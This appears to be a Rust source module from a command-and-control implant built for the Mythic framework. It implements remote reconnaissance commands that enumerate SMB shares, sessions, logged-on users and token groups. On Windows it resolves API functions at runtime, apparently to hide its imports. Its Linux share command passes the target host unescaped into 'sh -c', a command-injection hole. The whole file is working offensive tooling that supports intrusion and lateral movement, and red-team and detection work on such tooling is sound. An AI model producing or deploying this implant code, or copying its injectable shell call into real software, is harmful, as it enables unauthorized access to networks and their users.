use crate::AgentTask;
use crate::mythic_success;
use serde::Deserialize;

#[derive(Deserialize)]
struct HostArgs {
    host: String,
}

/// Enumerate SMB shares on a host (Windows)
#[cfg(target_os = "windows")]
pub fn net_shares(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    use std::ptr;

    let args: HostArgs = serde_json::from_str(&task.parameters)?;

    unsafe {
        // Resolve NetShareEnum from netapi32.dll
        type NetShareEnumFn = unsafe extern "system" fn(
            *const u16,
            u32,
            *mut *mut u8,
            u32,
            *mut u32,
            *mut u32,
            *mut u32,
        ) -> u32;

        type NetApiBufferFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;

        let net_share_enum = match crate::winapi_resolve::resolve("netapi32.dll", "NetShareEnum") {
            Some(ptr) => std::mem::transmute::<_, NetShareEnumFn>(ptr),
            None => {
                return Ok(mythic_success!(task.id, "Failed to resolve NetShareEnum".to_string()));
            }
        };

        let net_api_buffer_free = match crate::winapi_resolve::resolve("netapi32.dll", "NetApiBufferFree") {
            Some(ptr) => std::mem::transmute::<_, NetApiBufferFreeFn>(ptr),
            None => {
                return Ok(mythic_success!(task.id, "Failed to resolve NetApiBufferFree".to_string()));
            }
        };

        // Convert hostname to wide string
        let hostname_wide: Vec<u16> = args.host.encode_utf16().chain(std::iter::once(0)).collect();

        let mut buffer: *mut u8 = ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        let mut resume_handle: u32 = 0;

        // Level 1 provides share name and type
        let result = net_share_enum(
            hostname_wide.as_ptr(),
            1,
            &mut buffer,
            0xFFFFFFFF,
            &mut entries_read,
            &mut total_entries,
            &mut resume_handle,
        );

        if result != 0 {
            return Ok(mythic_success!(task.id, format!("NetShareEnum failed with error code: {}", result)));
        }

        #[repr(C)]
        struct SHARE_INFO_1 {
            netname: *mut u16,
            share_type: u32,
            remark: *mut u16,
        }

        let mut shares = Vec::new();
        let share_array = buffer as *const SHARE_INFO_1;

        for i in 0..entries_read {
            let share = &*share_array.offset(i as isize);
            let name = wide_to_string(share.netname);
            let remark = wide_to_string(share.remark);

            let share_type_str = match share.share_type {
                0 => "Disk",
                1 => "Print",
                2 => "Device",
                3 => "IPC",
                _ => "Unknown",
            };

            shares.push(serde_json::json!({
                "name": name,
                "type": share_type_str,
                "remark": remark,
            }));
        }

        net_api_buffer_free(buffer as *mut std::ffi::c_void);

        let result_str = format!("Shares on {}:\n{}", args.host, serde_json::to_string_pretty(&shares)?);
        Ok(mythic_success!(task.id, result_str))
    }
}

#[cfg(target_os = "windows")]
unsafe fn wide_to_string(ptr: *mut u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0;
    while *ptr.offset(len) != 0 {
        len += 1;
    }
    let slice = std::slice::from_raw_parts(ptr, len as usize);
    String::from_utf16_lossy(slice)
}

/// Enumerate SMB shares on a host (Linux)
#[cfg(target_os = "linux")]
pub fn net_shares(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    use std::process::Command;
    let args: HostArgs = serde_json::from_str(&task.parameters)?;

    let output = Command::new("sh")
        .arg("-c")
        .arg(format!("smbclient -L {} -N 2>/dev/null || echo 'smbclient not available'", args.host))
        .output()?;

    let result = format!(
        "Stdout:\n{}\nStderr:\n{}",
        std::str::from_utf8(&output.stdout)?,
        std::str::from_utf8(&output.stderr)?
    );

    Ok(mythic_success!(task.id, result))
}

/// Enumerate active sessions on a remote host
pub fn net_sessions(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_success!(task.id, "net_sessions is only supported on Windows".to_string()));
    }

    #[cfg(target_os = "windows")]
    {
        use std::ptr;

        let args: HostArgs = serde_json::from_str(&task.parameters)?;

        unsafe {
            // Resolve NetSessionEnum from netapi32.dll
            type NetSessionEnumFn = unsafe extern "system" fn(
                *const u16,
                *const u16,
                *const u16,
                u32,
                *mut *mut u8,
                u32,
                *mut u32,
                *mut u32,
                *mut u32,
            ) -> u32;

            type NetApiBufferFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;

            let net_session_enum = match crate::winapi_resolve::resolve("netapi32.dll", "NetSessionEnum") {
                Some(ptr) => std::mem::transmute::<_, NetSessionEnumFn>(ptr),
                None => {
                    return Ok(mythic_success!(task.id, "Failed to resolve NetSessionEnum".to_string()));
                }
            };

            let net_api_buffer_free = match crate::winapi_resolve::resolve("netapi32.dll", "NetApiBufferFree") {
                Some(ptr) => std::mem::transmute::<_, NetApiBufferFreeFn>(ptr),
                None => {
                    return Ok(mythic_success!(task.id, "Failed to resolve NetApiBufferFree".to_string()));
                }
            };

            // Convert hostname to wide string
            let hostname_wide: Vec<u16> = args.host.encode_utf16().chain(std::iter::once(0)).collect();

            let mut buffer: *mut u8 = ptr::null_mut();
            let mut entries_read: u32 = 0;
            let mut total_entries: u32 = 0;
            let mut resume_handle: u32 = 0;

            // Level 10 provides session info
            let result = net_session_enum(
                hostname_wide.as_ptr(),
                ptr::null(),
                ptr::null(),
                10,
                &mut buffer,
                0xFFFFFFFF,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            );

            if result != 0 {
                return Ok(mythic_success!(task.id, format!("NetSessionEnum failed with error code: {}", result)));
            }

            #[repr(C)]
            struct SESSION_INFO_10 {
                cname: *mut u16,
                username: *mut u16,
                time: u32,
                idle_time: u32,
            }

            let mut sessions = Vec::new();
            let session_array = buffer as *const SESSION_INFO_10;

            for i in 0..entries_read {
                let session = &*session_array.offset(i as isize);
                let client = wide_to_string(session.cname);
                let user = wide_to_string(session.username);

                sessions.push(serde_json::json!({
                    "client": client,
                    "username": user,
                    "time": session.time,
                    "idle_time": session.idle_time,
                }));
            }

            net_api_buffer_free(buffer as *mut std::ffi::c_void);

            let result_str = format!("Sessions on {}:\n{}", args.host, serde_json::to_string_pretty(&sessions)?);
            Ok(mythic_success!(task.id, result_str))
        }
    }
}

/// List users logged on to a remote host
pub fn net_loggedon(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_success!(task.id, "net_loggedon is only supported on Windows".to_string()));
    }

    #[cfg(target_os = "windows")]
    {
        use std::ptr;

        let args: HostArgs = serde_json::from_str(&task.parameters)?;

        unsafe {
            // Resolve NetWkstaUserEnum from netapi32.dll
            type NetWkstaUserEnumFn = unsafe extern "system" fn(
                *const u16,
                u32,
                *mut *mut u8,
                u32,
                *mut u32,
                *mut u32,
                *mut u32,
            ) -> u32;

            type NetApiBufferFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;

            let net_wksta_user_enum = match crate::winapi_resolve::resolve("netapi32.dll", "NetWkstaUserEnum") {
                Some(ptr) => std::mem::transmute::<_, NetWkstaUserEnumFn>(ptr),
                None => {
                    return Ok(mythic_success!(task.id, "Failed to resolve NetWkstaUserEnum".to_string()));
                }
            };

            let net_api_buffer_free = match crate::winapi_resolve::resolve("netapi32.dll", "NetApiBufferFree") {
                Some(ptr) => std::mem::transmute::<_, NetApiBufferFreeFn>(ptr),
                None => {
                    return Ok(mythic_success!(task.id, "Failed to resolve NetApiBufferFree".to_string()));
                }
            };

            // Convert hostname to wide string
            let hostname_wide: Vec<u16> = args.host.encode_utf16().chain(std::iter::once(0)).collect();

            let mut buffer: *mut u8 = ptr::null_mut();
            let mut entries_read: u32 = 0;
            let mut total_entries: u32 = 0;
            let mut resume_handle: u32 = 0;

            // Level 1 provides username and domain
            let result = net_wksta_user_enum(
                hostname_wide.as_ptr(),
                1,
                &mut buffer,
                0xFFFFFFFF,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            );

            if result != 0 {
                return Ok(mythic_success!(task.id, format!("NetWkstaUserEnum failed with error code: {}", result)));
            }

            #[repr(C)]
            struct WKSTA_USER_INFO_1 {
                username: *mut u16,
                logon_domain: *mut u16,
                oth_domains: *mut u16,
                logon_server: *mut u16,
            }

            let mut users = Vec::new();
            let user_array = buffer as *const WKSTA_USER_INFO_1;

            for i in 0..entries_read {
                let user_info = &*user_array.offset(i as isize);
                let username = wide_to_string(user_info.username);
                let domain = wide_to_string(user_info.logon_domain);
                let server = wide_to_string(user_info.logon_server);

                users.push(serde_json::json!({
                    "username": username,
                    "domain": domain,
                    "logon_server": server,
                }));
            }

            net_api_buffer_free(buffer as *mut std::ffi::c_void);

            let result_str = format!("Logged on users on {}:\n{}", args.host, serde_json::to_string_pretty(&users)?);
            Ok(mythic_success!(task.id, result_str))
        }
    }
}

/// Get detailed current user information (Windows)
#[cfg(target_os = "windows")]
pub fn whoami_cmd(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    use std::ptr;

    unsafe {
        // Resolve required functions
        type GetCurrentProcessFn = unsafe extern "system" fn() -> *mut std::ffi::c_void;
        type OpenProcessTokenFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut *mut std::ffi::c_void) -> i32;
        type GetTokenInformationFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;
        type LookupAccountSidWFn = unsafe extern "system" fn(*const u16, *mut std::ffi::c_void, *mut u16, *mut u32, *mut u16, *mut u32, *mut u32) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        let get_current_process = match crate::winapi_resolve::resolve("kernel32.dll", "GetCurrentProcess") {
            Some(ptr) => std::mem::transmute::<_, GetCurrentProcessFn>(ptr),
            None => return Ok(mythic_success!(task.id, "Failed to resolve GetCurrentProcess".to_string())),
        };

        let open_process_token = match crate::winapi_resolve::resolve("advapi32.dll", "OpenProcessToken") {
            Some(ptr) => std::mem::transmute::<_, OpenProcessTokenFn>(ptr),
            None => return Ok(mythic_success!(task.id, "Failed to resolve OpenProcessToken".to_string())),
        };

        let get_token_information = match crate::winapi_resolve::resolve("advapi32.dll", "GetTokenInformation") {
            Some(ptr) => std::mem::transmute::<_, GetTokenInformationFn>(ptr),
            None => return Ok(mythic_success!(task.id, "Failed to resolve GetTokenInformation".to_string())),
        };

        let lookup_account_sid_w = match crate::winapi_resolve::resolve("advapi32.dll", "LookupAccountSidW") {
            Some(ptr) => std::mem::transmute::<_, LookupAccountSidWFn>(ptr),
            None => return Ok(mythic_success!(task.id, "Failed to resolve LookupAccountSidW".to_string())),
        };

        let close_handle = match crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle") {
            Some(ptr) => std::mem::transmute::<_, CloseHandleFn>(ptr),
            None => return Ok(mythic_success!(task.id, "Failed to resolve CloseHandle".to_string())),
        };

        let process_handle = get_current_process();
        let mut token_handle: *mut std::ffi::c_void = ptr::null_mut();

        // TOKEN_QUERY = 0x0008
        if open_process_token(process_handle, 0x0008, &mut token_handle) == 0 {
            return Ok(mythic_success!(task.id, "Failed to open process token".to_string()));
        }

        // TokenUser = 1
        let mut return_length: u32 = 0;
        get_token_information(token_handle, 1, ptr::null_mut(), 0, &mut return_length);

        let mut token_user_buffer = vec![0u8; return_length as usize];
        if get_token_information(token_handle, 1, token_user_buffer.as_mut_ptr() as *mut std::ffi::c_void, return_length, &mut return_length) == 0 {
            close_handle(token_handle);
            return Ok(mythic_success!(task.id, "Failed to get token user information".to_string()));
        }

        // TOKEN_USER structure: first field is SID_AND_ATTRIBUTES which has SID as first member
        let sid_ptr = *(token_user_buffer.as_ptr() as *const *mut std::ffi::c_void);

        let mut name_size: u32 = 256;
        let mut domain_size: u32 = 256;
        let mut name_buffer = vec![0u16; 256];
        let mut domain_buffer = vec![0u16; 256];
        let mut sid_type: u32 = 0;

        if lookup_account_sid_w(
            ptr::null(),
            sid_ptr,
            name_buffer.as_mut_ptr(),
            &mut name_size,
            domain_buffer.as_mut_ptr(),
            &mut domain_size,
            &mut sid_type,
        ) == 0 {
            close_handle(token_handle);
            return Ok(mythic_success!(task.id, "Failed to lookup account SID".to_string()));
        }

        let username = String::from_utf16_lossy(&name_buffer[..name_size as usize]);
        let domain = String::from_utf16_lossy(&domain_buffer[..domain_size as usize]);

        // Get TokenGroups
        // TokenGroups = 2
        let mut groups_length: u32 = 0;
        get_token_information(token_handle, 2, ptr::null_mut(), 0, &mut groups_length);

        let mut groups_buffer = vec![0u8; groups_length as usize];
        let mut groups_list = Vec::new();

        if get_token_information(token_handle, 2, groups_buffer.as_mut_ptr() as *mut std::ffi::c_void, groups_length, &mut groups_length) != 0 {
            // TOKEN_GROUPS structure: u32 count followed by array of SID_AND_ATTRIBUTES
            let group_count = *(groups_buffer.as_ptr() as *const u32);
            let groups_array = (groups_buffer.as_ptr() as usize + 8) as *const *mut std::ffi::c_void;

            for i in 0..group_count.min(50) {
                let group_sid = *groups_array.offset(i as isize * 2);
                let mut grp_name_size: u32 = 256;
                let mut grp_domain_size: u32 = 256;
                let mut grp_name_buffer = vec![0u16; 256];
                let mut grp_domain_buffer = vec![0u16; 256];
                let mut grp_sid_type: u32 = 0;

                if lookup_account_sid_w(
                    ptr::null(),
                    group_sid,
                    grp_name_buffer.as_mut_ptr(),
                    &mut grp_name_size,
                    grp_domain_buffer.as_mut_ptr(),
                    &mut grp_domain_size,
                    &mut grp_sid_type,
                ) != 0 {
                    let grp_name = String::from_utf16_lossy(&grp_name_buffer[..grp_name_size as usize]);
                    let grp_domain = String::from_utf16_lossy(&grp_domain_buffer[..grp_domain_size as usize]);
                    groups_list.push(format!("{}\\{}", grp_domain, grp_name));
                }
            }
        }

        // Get TokenPrivileges
        // TokenPrivileges = 3
        let mut privs_length: u32 = 0;
        get_token_information(token_handle, 3, ptr::null_mut(), 0, &mut privs_length);

        let mut privs_buffer = vec![0u8; privs_length as usize];
        let mut privs_list = Vec::new();

        if get_token_information(token_handle, 3, privs_buffer.as_mut_ptr() as *mut std::ffi::c_void, privs_length, &mut privs_length) != 0 {
            let priv_count = *(privs_buffer.as_ptr() as *const u32);
            privs_list.push(format!("Privilege count: {}", priv_count));
        }

        close_handle(token_handle);

        let result = serde_json::json!({
            "username": format!("{}\\{}", domain, username),
            "groups": groups_list,
            "privileges": privs_list,
        });

        Ok(mythic_success!(task.id, serde_json::to_string_pretty(&result)?))
    }
}

/// Get detailed current user information (Linux)
#[cfg(target_os = "linux")]
pub fn whoami_cmd(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    use std::process::Command;

    let output = Command::new("sh")
        .arg("-c")
        .arg("id && groups")
        .output()?;

    let result = format!(
        "Stdout:\n{}\nStderr:\n{}",
        std::str::from_utf8(&output.stdout)?,
        std::str::from_utf8(&output.stderr)?
    );

    Ok(mythic_success!(task.id, result))
}

/// Get detailed current user information (macOS)
#[cfg(target_os = "macos")]
pub fn whoami_cmd(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    use std::process::Command;

    let output = Command::new("sh")
        .arg("-c")
        .arg("id && groups")
        .output()?;

    let result = format!(
        "Stdout:\n{}\nStderr:\n{}",
        std::str::from_utf8(&output.stdout)?,
        std::str::from_utf8(&output.stderr)?
    );

    Ok(mythic_success!(task.id, result))
}

/// Enumerate SMB shares on a host (macOS/other)
#[cfg(not(any(target_os = "windows", target_os = "linux")))]
pub fn net_shares(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_success!(task.id, "net_shares is only supported on Windows and Linux".to_string()))
}
